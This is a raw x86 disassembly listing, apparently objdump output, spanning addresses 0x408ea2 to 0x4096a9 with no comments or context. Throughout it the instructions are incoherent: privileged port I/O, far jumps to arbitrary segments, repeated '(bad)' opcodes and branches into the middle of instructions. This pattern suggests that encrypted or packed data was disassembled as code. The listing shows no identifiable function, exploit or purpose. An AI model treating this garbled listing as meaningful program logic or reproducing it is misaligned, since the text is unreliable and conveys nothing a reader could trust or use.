  408ea2:	mov    al,ds:0x36d7800a
  408ea7:	sbb    eax,0xee4bff8b
  408eac:	mov    BYTE PTR [esi+esi*8],al
  408eaf:	cwde   
  408eb0:	sub    BYTE PTR [esp+edx*1-0x3c],cl
  408eb4:	nop
  408eb5:	push   eax
  408eb6:	outs   dx,BYTE PTR ds:[esi]
  408eb7:	push   ss
  408eb8:	call   edi
  408eba:	mov    ebx,0xfbb45e6a
  408ebf:	or     bl,ch
  408ec1:	push   ebp
  408ec2:	mov    ebx,0x37f23534
  408ec7:	int3   
  408ec8:	cmp    ecx,DWORD PTR [ebx-0x62]
  408ecb:	scas   al,BYTE PTR es:[edi]
  408ecc:	jbe    0x408e75
  408ece:	popa   
  408ecf:	out    0x1d,eax
  408ed1:	test   al,0x42
  408ed3:	adc    eax,0xf27e792d
  408ed8:	int    0xe
  408eda:	and    eax,0x3e9a15b2
  408edf:	pop    eax
  408ee0:	adc    al,0x71
  408ee2:	fimul  DWORD PTR [eax+0x0]
  408ee5:	imul   ebx,DWORD PTR [edx+0x3e9b1baf],0x5a79ec58
  408eef:	sbb    DWORD PTR [edx-0x1b],ebp
  408ef2:	fst    QWORD PTR [ecx-0x29]
  408ef5:	ret    
  408ef6:	jae    0x408f6e
  408ef8:	mov    ebp,0x3fbd4e32
  408efd:	enter  0x7dab,0xff
  408f01:	or     al,0xf3
  408f03:	imul   DWORD PTR [edx+0x16393df7]
  408f09:	fnsave [ebp-0x180b2955]
  408f0f:	arpl   WORD PTR [ebx],sp
  408f11:	or     edx,edi
  408f13:	dec    ebx
  408f14:	das    
  408f15:	dec    edx
  408f16:	push   edi
  408f17:	mov    al,0x24
  408f19:	sbb    esp,0xffffff8f
  408f1c:	sub    eax,0xe344ed2c
  408f21:	jne    0x408edd
  408f23:	lahf   
  408f24:	pop    ss
  408f25:	dec    edx
  408f26:	push   ebp
  408f27:	mov    ch,0xc8
  408f29:	imul   ebp,DWORD PTR [ecx+edx*1-0x79],0xb6416fcf
  408f31:	jmp    0x8596:0xef88b62c
  408f38:	push   ss
  408f39:	cdq    
  408f3a:	scas   al,BYTE PTR es:[edi]
  408f3b:	cmp    ebx,DWORD PTR [ecx+0x32]
  408f3e:	mov    esi,0x35a11939
  408f43:	pop    ebp
  408f44:	push   ebp
  408f45:	cli    
  408f46:	icebp  
  408f47:	xchg   ebx,eax
  408f48:	xor    esp,DWORD PTR [edx+0x3c29a602]
  408f4e:	mov    al,es:0x7c104b99
  408f54:	das    
  408f55:	adc    al,BYTE PTR [eax+0x50]
  408f58:	daa    
  408f59:	mov    dl,0x7
  408f5b:	je     0x408ee1
  408f5d:	out    0xeb,al
  408f5f:	call   FWORD PTR [ecx]
  408f61:	(bad)  
  408f62:	repnz push eax
  408f64:	sub    al,BYTE PTR [ecx-0x71]
  408f67:	jp     0x408fd3
  408f69:	out    dx,eax
  408f6a:	ja     0x408fbb
  408f6c:	lods   al,BYTE PTR ds:[esi]
  408f6d:	mov    ch,0x35
  408f6f:	dec    edx
  408f70:	je     0x408f2b
  408f72:	push   edx
  408f73:	aam    0xd3
  408f75:	add    BYTE PTR [eax-0x64],0x7
  408f79:	push   es
  408f7a:	and    eax,0xb06509d
  408f7f:	bound  ebx,QWORD PTR [edx]
  408f81:	ins    BYTE PTR es:[edi],dx
  408f82:	add    DWORD PTR [eax+0x12acb206],edx
  408f88:	inc    esp
  408f89:	jns    0x408f40
  408f8b:	mov    edi,0xf74b3321
  408f90:	ins    DWORD PTR es:[edi],dx
  408f91:	call   0x7dd84737
  408f96:	cli    
  408f97:	dec    esp
  408f98:	and    eax,0x42308f4a
  408f9d:	bound  esp,QWORD PTR [eax+0x6ec23ae0]
  408fa3:	mov    eax,0xd282e820
  408fa8:	push   ss
  408fa9:	mov    esi,0xb32b3bc7
  408fae:	je     0x40900e
  408fb0:	jbe    0x408ff4
  408fb2:	pop    ecx
  408fb3:	xchg   ebx,eax
  408fb4:	lods   eax,DWORD PTR ds:[esi]
  408fb5:	leave  
  408fb6:	push   ds
  408fb7:	aam    0xf1
  408fb9:	ret    0x9ff4
  408fbc:	lds    ebx,FWORD PTR [ecx+edi*2-0x31]
  408fc0:	xor    eax,0x6026c52d
  408fc5:	scas   eax,DWORD PTR es:[edi]
  408fc6:	int3   
  408fc7:	jbe    0x408f88
  408fc9:	xchg   DWORD PTR [ecx],eax
  408fcb:	cmp    DWORD PTR [ebp-0x4],0x72b28e5d
  408fd2:	sub    edx,DWORD PTR [eax+0x65]
  408fd5:	jne    0x408fa3
  408fd7:	maskmovq mm0,(bad)
  408fd8:	test   DWORD PTR [ecx],0x967692b7
  408fde:	mov    dl,0xca
  408fe0:	pop    es
  408fe1:	and    eax,0x35ff6095
  408fe6:	repz mov eax,ds:0x65012307
  408fec:	mov    edi,0x3f8c6640
  408ff1:	fdiv   QWORD PTR [edx+0x3e]
  408ff4:	std    
  408ff5:	jmp    0x408fc0
  408ff7:	sub    al,0xad
  408ff9:	jmp    0x6:0x38382957
  409000:	push   0x1b6091f7
  409005:	xchg   ecx,eax
  409006:	inc    esp
  409007:	and    BYTE PTR [ebp+eax*2-0x6f979abd],dl
  40900e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40900f:	ins    DWORD PTR es:[edi],dx
  409010:	dec    esp
  409011:	sub    bl,al
  409013:	test   DWORD PTR [edi-0x6e],esp
  409016:	test   DWORD PTR [eax+0x52],ecx
  409019:	jb     0x409016
  40901b:	or     DWORD PTR [ebx-0x7c],ebx
  40901e:	pminsw mm3,QWORD PTR [eax+0x13]
  409022:	inc    ebx
  409023:	pop    edi
  409024:	jnp    0x409005
  409026:	inc    esi
  409027:	retf   0x9e8f
  40902a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40902b:	enter  0xb923,0x79
  40902f:	add    al,dl
  409031:	dec    esp
  409032:	sub    al,0xe
  409034:	jnp    0x409094
  409036:	sti    
  409037:	mov    bl,0x2d
  409039:	mov    eax,ds:0xde1c0185
  40903e:	dec    edi
  40903f:	and    al,0x3b
  409041:	sub    DWORD PTR [esi+0x3137a59f],ebx
  409047:	add    ah,cl
  409049:	xor    BYTE PTR [eax],al
  40904b:	pop    esp
  40904c:	bound  eax,QWORD PTR [ebx]
  40904e:	add    BYTE PTR [ebx],dl
  409050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409051:	xor    ecx,DWORD PTR [edi+edx*4-0x33c892f7]
  409058:	pop    edx
  40905a:	sub    BYTE PTR [eax+0x7882b691],ah
  409060:	into   
  409061:	xchg   esp,eax
  409062:	and    al,0xd
  409064:	sti    
  409065:	inc    edi
  409066:	dec    ecx
  409067:	jbe    0x40900c
  409069:	pop    edx
  40906a:	and    esi,ecx
  40906c:	xor    al,0x6a
  40906e:	jecxz  0x4090cb
  409070:	aam    0x1d
  409072:	clc    
  409073:	scas   eax,DWORD PTR es:[edi]
  409074:	jl     0x409039
  409076:	mov    ebx,0x19fb73d3
  40907b:	cmp    BYTE PTR [esi+0x23],0x55
  40907f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409080:	imul   DWORD PTR [edi+ebp*2-0x5d]
  409084:	clc    
  409085:	and    esi,ebp
  409087:	mov    edi,0xff4b323
  40908c:	pop    edx
  40908d:	or     ch,BYTE PTR [eax-0xb]
  409090:	mov    esp,0xdfb040f9
  409095:	cmp    al,0x15
  409097:	rcr    BYTE PTR [esp+ebp*2],0x16
  40909b:	adc    al,0x81
  40909d:	pop    ss
  40909e:	jl     0x409057
  4090a0:	xor    edi,ebp
  4090a2:	jno    0x40909e
  4090a4:	xchg   ebx,eax
  4090a5:	jp     0x40903b
  4090a7:	push   ds
  4090a8:	addr16 js 0x40906d
  4090ab:	push   esi
  4090ac:	dec    esi
  4090ad:	jns    0x4090dc
  4090af:	mov    edx,0x1bf435db
  4090b4:	call   0x2fa3bafe
  4090b9:	mov    DWORD PTR [esi+ebp*1+0x6],ebp
  4090bd:	add    al,0xec
  4090bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090c0:	mov    ebx,0xa49ec59e
  4090c5:	ror    DWORD PTR [ecx-0x1],cl
  4090c8:	jmp    0xe91fe081
  4090cd:	imul   esp,DWORD PTR [ebx+0x51bdf037],0x18
  4090d4:	arpl   dx,di
  4090d6:	xchg   esp,eax
  4090d7:	daa    
  4090d8:	jno    0x4090dc
  4090da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090db:	sub    cl,BYTE PTR [esi]
  4090dd:	dec    edx
  4090de:	xor    BYTE PTR ds:0xca708ab1,cl
  4090e4:	lahf   
  4090e5:	mov    al,ds:0x94adf5d7
  4090ea:	arpl   WORD PTR [eax-0x331108db],bp
  4090f0:	dec    ecx
  4090f1:	ror    DWORD PTR [ecx-0x3b232c89],1
  4090f7:	dec    edi
  4090f8:	push   ebx
  4090f9:	clc    
  4090fa:	jmp    0xc146:0xb50e5e67
  409101:	mov    al,0xc9
  409103:	outs   dx,BYTE PTR ds:[esi]
  409104:	push   ebx
  409105:	fdiv   DWORD PTR [edi+0x67]
  409108:	and    edi,DWORD PTR [ecx]
  40910a:	mov    ah,0x62
  40910c:	mov    eax,0xe0821e66
  409111:	sub    ah,ah
  409113:	add    al,0xce
  409115:	inc    ebp
  409116:	int    0xbd
  409118:	cmp    esi,0xffffffc2
  40911b:	test   al,0xb7
  40911d:	mov    al,ds:0xf6d4b7d8
  409122:	xor    al,0x93
  409124:	pop    esp
  409125:	dec    esp
  409126:	pop    ds
  409127:	ss mov bl,0x6d
  40912a:	mov    ah,0x72
  40912c:	add    esp,edx
  40912e:	test   DWORD PTR [edx-0x5bb390c0],ebp
  409134:	pop    eax
  409135:	mov    edi,0x44fd484f
  40913a:	les    esi,FWORD PTR ds:0x5ec00a40
  409140:	jp     0x40911a
  409142:	sub    esp,DWORD PTR [edx+0x24]
  409145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409146:	and    ah,BYTE PTR [eax]
  409148:	push   ecx
  409149:	adc    cl,BYTE PTR ds:0xe6a3273b
  40914f:	add    ecx,edx
  409151:	xchg   al,bh
  409153:	jp     0x409118
  409155:	mov    ?,WORD PTR [edi+ecx*4]
  409158:	mov    bh,0xb8
  40915a:	inc    esi
  40915b:	cmc    
  40915c:	mov    ch,0x33
  40915e:	test   eax,0xd097ca94
  409163:	imul   DWORD PTR [edi]
  409165:	call   0xd140cc
  40916a:	jp     0x409142
  40916c:	push   esp
  40916d:	enter  0x87f9,0x2
  409171:	cmp    eax,0xc46f5e34
  409176:	add    DWORD PTR [ecx+ebp*4+0x63d84335],esp
  40917d:	push   0xdfcd9e1b
  409182:	add    BYTE PTR ss:[ecx+ecx*2-0x21829b98],al
  40918a:	loope  0x409158
  40918c:	in     eax,0xae
  40918e:	inc    eax
  40918f:	adc    eax,0x5c2acc78
  409194:	sub    BYTE PTR [ebx+0x1d],0x31
  409198:	imul   eax,ecx,0x8da85e0c
  40919e:	and    eax,0xeded1ed
  4091a3:	push   edi
  4091a4:	push   0x7
  4091a6:	mov    BYTE PTR [ecx+esi*8-0x42aac03f],0x49
  4091ae:	cs jbe 0x409145
  4091b1:	inc    esi
  4091b2:	mov    edx,0x1fdc05f1
  4091b7:	(bad)  
  4091b8:	dec    ebx
  4091b9:	fild   QWORD PTR [eax]
  4091bb:	cmp    cl,0xcf
  4091be:	mov    DWORD PTR [eax],ecx
  4091c0:	in     eax,dx
  4091c1:	cli    
  4091c2:	jns    0x409239
  4091c4:	add    DWORD PTR [ecx+0x27ba397d],0x5d
  4091cb:	pop    ebx
  4091cc:	push   esp
  4091cd:	or     eax,0x38bcd208
  4091d2:	add    BYTE PTR [ebx+0x78800cc2],bl
  4091d8:	jg     0x409199
  4091da:	mov    gs,ebx
  4091dc:	fsubrp st(5),st
  4091de:	pusha  
  4091df:	aas    
  4091e0:	mov    esp,0x412758ba
  4091e5:	cmp    bp,WORD PTR [ebp-0x2e]
  4091e9:	xchg   ebp,eax
  4091ea:	je     0x409228
  4091ec:	ins    DWORD PTR es:[edi],dx
  4091ed:	leave  
  4091ee:	pop    ds
  4091ef:	bound  esi,QWORD PTR [ecx+0x1e]
  4091f2:	xor    DWORD PTR [eax],eax
  4091f4:	imul   edx,DWORD PTR [ecx+0xa2e9d0a],0x20
  4091fb:	and    BYTE PTR [ebx],bl
  4091fd:	lods   al,BYTE PTR ds:[esi]
  4091fe:	mov    edi,0xdcf14aad
  409203:	adc    al,0xdd
  409205:	cdq    
  409206:	sbb    BYTE PTR [eax-0x47b2a735],ah
  40920c:	inc    edi
  40920d:	fisttp DWORD PTR [esi]
  40920f:	sahf   
  409210:	fs mov ah,0x87
  409213:	xchg   esp,eax
  409214:	add    DWORD PTR [ebx+0x4db7ae16],eax
  40921a:	daa    
  40921b:	and    DWORD PTR [eax],0xfffffff1
  40921e:	pop    es
  40921f:	or     DWORD PTR [esi],edi
  409221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409222:	ins    BYTE PTR es:[edi],dx
  409223:	xchg   esi,eax
  409224:	fidivr WORD PTR ds:0xd97e2136
  40922a:	aas    
  40922b:	xor    eax,0xea168213
  409230:	mov    esi,0x5ce7a1b6
  409235:	(bad)  
  409236:	loopne 0x4091eb
  409238:	mov    cl,0x3
  40923a:	pushf  
  40923b:	lods   eax,DWORD PTR ds:[esi]
  40923c:	into   
  40923d:	ins    BYTE PTR es:[edi],dx
  40923e:	push   ebx
  40923f:	xor    ecx,DWORD PTR [ecx-0x40]
  409242:	mov    WORD PTR [ecx-0x30],es
  409245:	dec    esi
  409246:	adc    BYTE PTR [edx+edx*8],dh
  409249:	fldenv [eax]
  40924b:	out    0x85,eax
  40924d:	sbb    al,0xb3
  40924f:	scas   eax,DWORD PTR es:[edi]
  409250:	pop    ss
  409251:	in     al,dx
  409252:	or     esp,DWORD PTR [edi]
  409254:	jo     0x4092c2
  409256:	test   eax,0x815411cf
  40925b:	or     al,0x93
  40925d:	xor    al,0x73
  40925f:	sbb    ebx,eax
  409261:	or     esi,DWORD PTR [eax+0x7b]
  409264:	out    dx,eax
  409265:	add    BYTE PTR [ebp-0x6],dl
  409268:	pop    ebp
  409269:	mov    edx,0xf4a327f9
  40926e:	dec    ebx
  40926f:	fwait
  409270:	(bad)  
  409271:	xor    eax,0x7c231faa
  409276:	pop    ss
  409277:	xchg   edx,eax
  409278:	add    dh,dh
  40927a:	inc    edx
  40927b:	inc    eax
  40927c:	jns    0x4092aa
  40927e:	pop    es
  40927f:	mov    ebx,0xa19210eb
  409284:	push   esp
  409285:	mov    cl,0x96
  409287:	xchg   ebp,eax
  409288:	dec    esi
  409289:	das    
  40928a:	sbb    eax,0xfa919cca
  40928f:	std    
  409290:	pminsw mm3,QWORD PTR [ebx+0x535452bb]
  409297:	aad    0x6
  409299:	cmp    BYTE PTR [ebx],0xf4
  40929c:	test   BYTE PTR [eax],bl
  40929e:	mov    BYTE PTR [ecx-0x2a9904c2],cl
  4092a4:	xor    ah,BYTE PTR [ebx]
  4092a6:	add    DWORD PTR [ecx+ebp*2+0x46680071],esp
  4092ad:	ss jecxz 0x40928b
  4092b0:	lahf   
  4092b1:	ins    DWORD PTR es:[edi],dx
  4092b2:	mov    al,ds:0xccd2930b
  4092b7:	cmp    BYTE PTR [ebp+0x6ac651c9],bh
  4092bd:	mov    ebx,0xf047915f
  4092c2:	outs   dx,DWORD PTR ds:[esi]
  4092c3:	mov    edx,0xcc0a508a
  4092c8:	into   
  4092c9:	ror    bl,cl
  4092cb:	or     bl,BYTE PTR [ebp-0x21]
  4092ce:	add    cl,BYTE PTR [esi+0x5da70ec1]
  4092d4:	fcomp  QWORD PTR [ebx-0x2129743a]
  4092da:	test   al,0x6e
  4092dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092dd:	dec    edx
  4092de:	nop
  4092df:	and    ebp,esi
  4092e1:	js     0x40926b
  4092e3:	push   esp
  4092e4:	dec    ebp
  4092e5:	dec    esp
  4092e6:	hlt    
  4092e7:	pop    ds
  4092e8:	mov    WORD PTR [ecx-0x659e4c81],es
  4092ee:	(bad)  
  4092ef:	jb     0x409330
  4092f1:	hlt    
  4092f2:	push   cs
  4092f3:	jne    0x4092c6
  4092f5:	aas    
  4092f6:	aas    
  4092f7:	xchg   edx,eax
  4092f8:	outs   dx,DWORD PTR ds:[esi]
  4092f9:	sbb    dl,BYTE PTR [esp+eax*1]
  4092fc:	retf   0x3136
  4092ff:	push   0x4b
  409301:	sbb    al,0x80
  409303:	xor    DWORD PTR [eax],ecx
  409305:	sub    al,0x16
  409307:	add    ah,dh
  409309:	outs   dx,BYTE PTR ds:[esi]
  40930a:	push   es
  40930b:	add    BYTE PTR [esi+ebx*8+0x7d],al
  40930f:	data16 aad 0xa
  409312:	cli    
  409313:	fisubr WORD PTR [ecx-0x4b]
  409316:	push   ecx
  409317:	and    eax,0xff00fe18
  40931c:	jbe    0x409389
  40931e:	cmp    al,0x2e
  409320:	test   DWORD PTR [eax+eiz*8],ebp
  409323:	rcr    BYTE PTR [ecx],cl
  409325:	aad    0x3a
  409327:	fist   DWORD PTR [eax+0x4a5775de]
  40932d:	jge    0x4093a8
  40932f:	retf   0x384d
  409332:	mov    ds:0x287d00ab,al
  409337:	push   ds
  409338:	mov    eax,ds:0xb43de227
  40933d:	xchg   bh,cl
  40933f:	mov    ebp,0x46e72a53
  409344:	push   esp
  409345:	loopne 0x40934b
  409347:	jg     0x409358
  409349:	mov    esp,edi
  40934b:	inc    esi
  40934c:	mov    bh,0xbf
  40934e:	mov    cl,0x8d
  409350:	mov    bl,0xeb
  409352:	push   esp
  409353:	call   0xbaaa2ce5
  409358:	pop    edx
  409359:	out    dx,eax
  40935a:	shl    BYTE PTR [edx-0xc],1
  40935d:	jmp    DWORD PTR [eax-0x17665855]
  409363:	outs   dx,DWORD PTR ds:[esi]
  409364:	shrd   ebx,edx,0xe2
  409368:	out    dx,eax
  409369:	loopne 0x4093af
  40936b:	psrlq  mm7,mm1
  40936e:	xchg   edi,eax
  40936f:	retf   0xe7ec
  409372:	add    cl,BYTE PTR [ecx+eax*2]
  409375:	jne    0x409397
  409377:	in     al,dx
  409378:	jae    0x40932a
  40937a:	in     eax,dx
  40937b:	int    0xc
  40937d:	pushf  
  40937e:	lods   eax,DWORD PTR ds:[esi]
  40937f:	fcomp  QWORD PTR [ebp-0x52133c99]
  409385:	aam    0x0
  409387:	inc    ebx
  409388:	rcl    DWORD PTR [ebp+0x71],0x84
  40938c:	out    0xec,al
  40938e:	add    ch,bl
  409390:	and    esi,DWORD PTR [ecx-0x6]
  409393:	mov    WORD PTR [edi+0x109a41e0],ds
  409399:	cmp    eax,0x6ad492f5
  40939e:	xchg   ecx,eax
  40939f:	add    dh,dl
  4093a1:	div    DWORD PTR [ecx+edx*8-0x4f555d4f]
  4093a8:	test   BYTE PTR [edx],dh
  4093aa:	call   0xe8b4f9e0
  4093af:	mov    edi,0xd780479
  4093b4:	je     0x409409
  4093b6:	mov    edx,0xe7a9316
  4093bb:	adc    eax,0x581bf31e
  4093c0:	push   edx
  4093c1:	clc    
  4093c2:	mov    BYTE PTR [esi+0x38831a36],bh
  4093c8:	jl     0x4093ce
  4093ca:	inc    ebx
  4093cb:	mov    eax,ds:0xefa7ac98
  4093d0:	pop    es
  4093d1:	or     DWORD PTR [eax-0x16],esp
  4093d4:	dec    esp
  4093d5:	xchg   edi,eax
  4093d6:	clc    
  4093d7:	jmp    0x9924:0x8b2a9ef7
  4093de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093df:	lock and bl,BYTE PTR [ebx+0x7c11cf61]
  4093e6:	into   
  4093e7:	mov    al,ds:0x952613c4
  4093ec:	xor    eax,0x80820a93
  4093f1:	sub    DWORD PTR [esi+edx*8-0x58bd53e5],0x786525a4
  4093fc:	iret   
  4093fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093fe:	pushf  
  4093ff:	ds leave 
  409401:	add    BYTE PTR [esp+eax*2+0x559f9470],0x52
  409409:	mov    cl,ch
  40940b:	into   
  40940c:	push   esp
  40940d:	inc    esp
  40940e:	jp     0x4093fb
  409410:	xor    ah,BYTE PTR [ebp+0xe77810a]
  409416:	push   0x29
  409418:	add    BYTE PTR [esi],bl
  40941a:	or     DWORD PTR [ebx],0x8e6e2f99
  409420:	push   edi
  409421:	push   0xcf46d538
  409426:	xor    BYTE PTR [eax],al
  409428:	fmul   QWORD PTR [edi-0x75]
  40942b:	jnp    0x40946b
  40942d:	in     al,dx
  40942e:	lds    ecx,FWORD PTR ds:0x802435df
  409434:	jl     0x40947e
  409436:	or     al,dh
  409438:	mov    ch,dh
  40943a:	mov    es,ecx
  40943c:	add    al,0xb2
  40943e:	std    
  40943f:	fsubr  st,st(7)
  409441:	xchg   edx,eax
  409442:	jp     0x4094be
  409444:	(bad)  
  409445:	dec    esp
  409446:	in     eax,0x5
  409448:	test   DWORD PTR [eax],esp
  40944a:	into   
  40944b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40944c:	jne    0x409437
  40944e:	in     eax,0x9f
  409450:	pop    edi
  409451:	test   DWORD PTR [edx],edi
  409453:	jnp    0x40948e
  409455:	add    DWORD PTR [eax],eax
  409457:	arpl   WORD PTR [ecx+0x745edd95],di
  40945d:	push   ebp
  40945e:	pop    ebp
  40945f:	dec    esp
  409460:	mov    ah,BYTE PTR [ecx-0x2dcbfc6b]
  409466:	push   ebx
  409467:	mov    eax,ds:0xbf09190b
  40946c:	fistp  QWORD PTR [ecx-0x558631b6]
  409472:	pop    esp
  409473:	nop
  409474:	dec    ebp
  409475:	adc    al,0x30
  409477:	push   0x948cfee3
  40947c:	xchg   BYTE PTR [edx-0x37],al
  40947f:	out    dx,al
  409480:	std    
  409481:	xor    ebp,ebp
  409483:	hlt    
  409484:	add    edi,DWORD PTR ds:0x3f8d
  409489:	xor    eax,0xa4c06e29
  40948e:	cmc    
  40948f:	and    BYTE PTR [eax],al
  409491:	cmp    DWORD PTR ds:0xe56e0181,0xa03bb2fe
  40949b:	fxch   st(2)
  40949d:	fimul  WORD PTR [edx+0x10608231]
  4094a3:	adc    ch,BYTE PTR es:[edi]
  4094a6:	out    0x6,al
  4094a8:	pop    esp
  4094a9:	mov    WORD PTR [edx-0x413cf8e7],ds
  4094af:	mov    bh,0x99
  4094b1:	fistp  QWORD PTR [esi+0x6f4052ff]
  4094b7:	mov    cl,0x36
  4094b9:	add    al,0x9f
  4094bb:	aad    0xbe
  4094bd:	dec    esi
  4094be:	xor    ebp,DWORD PTR [ecx+0x600d99a5]
  4094c4:	jb     0x409511
  4094c6:	xchg   edx,eax
  4094c7:	push   ds
  4094c8:	sub    esi,ebp
  4094ca:	rol    BYTE PTR [eax+0x21],1
  4094cd:	inc    ebx
  4094ce:	jnp    0x4094fb
  4094d0:	cmp    eax,0xe86fdb12
  4094d5:	shr    BYTE PTR [ecx-0x205856cf],1
  4094db:	add    edi,DWORD PTR [ebx]
  4094dd:	add    BYTE PTR [edi-0x2],cl
  4094e0:	xchg   esp,eax
  4094e1:	(bad)  [edi]
  4094e3:	cmp    DWORD PTR [esi],ecx
  4094e5:	pop    ecx
  4094e6:	push   es
  4094e7:	adc    ebx,0xdc5b903c
  4094ed:	cmp    ch,BYTE PTR [ebp-0x9]
  4094f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094f2:	xchg   WORD PTR fs:[edi+0x74c7242a],bp
  4094fa:	or     al,0x84
  4094fc:	mov    eax,ds:0xfbb68eaa
  409501:	mov    esp,0x9e218006
  409506:	mov    ebx,edi
  409508:	xor    dh,BYTE PTR ds:[ebx]
  40950b:	sldt   edx
  40950e:	pop    esp
  40950f:	ret    
  409510:	ss test ebp,eax
  409513:	jns    0x4094d9
  409515:	add    ebx,DWORD PTR [esi+0x31]
  409518:	mov    ds:0x18589285,al
  40951d:	or     al,bl
  40951f:	mov    BYTE PTR [edx+0x5f],0xbf
  409523:	pop    ss
  409524:	push   es
  409525:	fucompp 
  409527:	std    
  409528:	cmp    al,0xd7
  40952a:	pop    edi
  40952b:	xlat   BYTE PTR ds:[ebx]
  40952c:	pop    ebp
  40952d:	push   ebx
  40952e:	mov    ebx,0xe2f2e95f
  409533:	xor    eax,0x11cc56d9
  409538:	pop    ebx
  409539:	xchg   edi,eax
  40953a:	test   eax,0xa5402975
  40953f:	stc    
  409540:	or     edx,edx
  409542:	add    ah,dl
  409544:	add    ah,bl
  409546:	rcl    bh,0x52
  409549:	cmc    
  40954a:	dec    ecx
  40954b:	push   edx
  40954c:	rcl    BYTE PTR [ebx],cl
  40954e:	(bad)  
  40954f:	mov    esi,0x9f45d534
  409554:	mov    edi,0x7d50d234
  409559:	cmp    ebx,DWORD PTR ds:[esi+0x5f]
  40955d:	lock mov esp,0xd99f0c6
  409563:	test   al,0xbb
  409565:	es clc 
  409567:	dec    edi
  409568:	and    al,0x0
  40956a:	push   0xfffffff2
  40956c:	pusha  
  40956d:	imul   dl
  40956f:	(bad)  
  409570:	xchg   edi,eax
  409571:	adc    DWORD PTR [ebp+0x1e],ebp
  409574:	pop    ebx
  409575:	xor    DWORD PTR [eax+0x5f],ecx
  409578:	pushf  
  409579:	scas   al,BYTE PTR es:[edi]
  40957a:	test   eax,0x21825c92
  40957f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409580:	inc    esi
  409581:	in     al,0x96
  409583:	cdq    
  409584:	sub    BYTE PTR [ebx-0x162ff5da],al
  40958a:	shl    BYTE PTR [ebx],1
  40958c:	dec    eax
  40958d:	adc    eax,0x4181306d
  409592:	lock sbb ah,BYTE PTR [eax-0x79adc4fa]
  409599:	scas   eax,DWORD PTR es:[edi]
  40959a:	in     al,dx
  40959b:	fld    QWORD PTR gs:[edi]
  40959e:	cmp    esi,ebp
  4095a0:	pushf  
  4095a1:	sbb    al,0xa3
  4095a3:	push   ebp
  4095a4:	into   
  4095a5:	add    BYTE PTR [ebp-0x1d],bl
  4095a8:	out    0x68,al
  4095aa:	out    dx,eax
  4095ab:	inc    esp
  4095ac:	lea    ebp,[esi-0x6549101e]
  4095b2:	popf   
  4095b3:	jle    0x40961e
  4095b5:	push   cs
  4095b6:	leave  
  4095b7:	nop
  4095b8:	in     al,0x73
  4095ba:	nop
  4095bb:	ret    0x1e0d
  4095be:	inc    ecx
  4095bf:	push   ecx
  4095c0:	js     0x40956b
  4095c2:	sub    edi,DWORD PTR [esi-0x793006c3]
  4095c8:	xchg   esi,eax
  4095c9:	push   0x50
  4095cb:	mov    ds:0x3c179c25,eax
  4095d0:	(bad)  
  4095d2:	fmul   st(2),st
  4095d4:	ds popa 
  4095d6:	aas    
  4095d7:	pop    ebx
  4095d8:	fmul   DWORD PTR [edx]
  4095da:	pop    ds
  4095db:	add    DWORD PTR es:[esi+eax*2],ebp
  4095df:	shr    ebx,0xb4
  4095e2:	push   edx
  4095e3:	and    eax,0x7701b95a
  4095e8:	outs   dx,BYTE PTR ds:[esi]
  4095e9:	call   0x9d64918e
  4095ee:	loop   0x4095ee
  4095f0:	sti    
  4095f1:	into   
  4095f2:	int3   
  4095f3:	and    BYTE PTR ds:0xdea29d18,bl
  4095f9:	jle    0x409610
  4095fb:	retf   
  4095fc:	sbb    dl,0x7f
  4095ff:	fcomp  DWORD PTR [ebp-0x39]
  409602:	rcr    ebx,cl
  409604:	jnp    0x40965d
  409606:	and    al,0x9d
  409608:	mov    esp,0x495dcf8b
  40960d:	arpl   si,di
  40960f:	xor    al,0x5d
  409611:	mov    edx,DWORD PTR ds:0xbd53ef32
  409617:	aaa    
  409618:	dec    esi
  409619:	push   ebx
  40961a:	rol    DWORD PTR ds:0x919f903a,cl
  409620:	int    0x56
  409622:	xchg   ch,dh
  409624:	mov    ss,eax
  409626:	and    esp,esp
  409628:	xor    al,0x2
  40962a:	push   0x3e
  40962c:	jne    0x40965f
  40962e:	scas   eax,DWORD PTR es:[edi]
  40962f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409630:	lds    eax,FWORD PTR [edx-0x2e213b78]
  409636:	mov    dl,0x44
  409638:	sbb    eax,0x6969a6
  40963d:	mov    al,0x58
  40963f:	pop    ds
  409640:	push   eax
  409641:	xchg   ebx,eax
  409642:	div    DWORD PTR [eax]
  409644:	jnp    0x4095df
  409646:	int    0x37
  409648:	xor    BYTE PTR [eax-0x630e7491],bl
  40964e:	pop    DWORD PTR [eax+ebp*8-0x22]
  409652:	jp     0x40965b
  409654:	cmp    eax,0xc1fffac2
  409659:	dec    esp
  40965a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40965b:	xor    DWORD PTR [edi-0x29],ecx
  40965e:	or     DWORD PTR [eax],eax
  409660:	shr    ch,0x19
  409663:	mov    bl,0xee
  409665:	test   eax,0xfc468d0a
  40966a:	mov    ecx,0x500a87fe
  40966f:	addr16 mov esi,0xc6007133
  409675:	in     eax,0x8e
  409677:	mov    al,ds:0x50de3fa0
  40967c:	mov    eax,ds:0xe7cb5ff3
  409681:	jle    0x409626
  409683:	dec    eax
  409684:	lahf   
  409685:	dec    edi
  409686:	das    
  409687:	fcom   QWORD PTR [esp+eax*8-0xa]
  40968b:	jl     0x409611
  40968d:	add    eax,0x15535b0
  409692:	ret    0x5306
  409695:	add    DWORD PTR [eax+0x17],eax
  409698:	std    
  409699:	stos   DWORD PTR es:[edi],eax
  40969a:	cmp    ebp,0xffffffec
  40969d:	fild   DWORD PTR [edi*4-0x5d49e478]
  4096a4:	mov    edi,0x35ee68ce
  4096a9:	mov    WORD PTR [eax+0x37e5f68e],es
